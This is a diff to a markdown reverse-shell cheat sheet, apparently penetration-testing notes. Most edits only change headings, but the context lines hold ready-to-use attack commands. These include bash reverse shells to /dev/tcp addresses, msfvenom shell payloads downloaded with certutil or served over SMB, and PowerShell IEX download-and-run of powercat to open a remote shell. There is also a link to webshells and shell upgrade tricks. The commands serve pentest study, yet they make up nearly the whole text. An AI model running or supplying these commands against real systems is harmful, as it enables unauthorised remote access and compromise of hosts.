@@ -12,8 +12,8 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 /bin/bash -l > /dev/tcp/192.168.45.161/1443 0<&1 2>&1
 ```
 
-##### Windows
-####  CMD
+### Windows
+#####  CMD
 ```
 #Generate reverse shell.
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o myshell.exe
@@ -25,7 +25,7 @@ certutil -urlcache -split -f http://192.168.45.178:80/myshell.exe C:\\users\\<us
 C:\\users\\<user>\\myshell.exe
 ```
 
-### SMB Share
+##### SMB Share
 ```
 #Generate reverse shell.
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o myshell.exe
@@ -37,14 +37,14 @@ impacket-smbserver -smb2support kali $PWD
 //<kali-ip>/kali/myshell.exe
 ```
 
-#### Powershell
+##### Powershell
 
 ```
 #Using powercat.
 Method 1. IEX (New-Object System.Net.Webclient).DownloadString("http://<ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell
 Method 2. powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"
 ```
-###### Base64 Encode
+##### Base64 Encode
 
 ```
 #PowerShell Script
@@ -74,6 +74,7 @@ https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
 ```
 
 #### Upgrades
+#### Linux
 ```
 #interactive upgrade
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -84,4 +85,11 @@ python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rc
 
 #enables clear
 export TERM=xterm
+```
+
+#### Windows
+```
+#If you are finding basic commands can't be recognised.
+set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
+
 ```
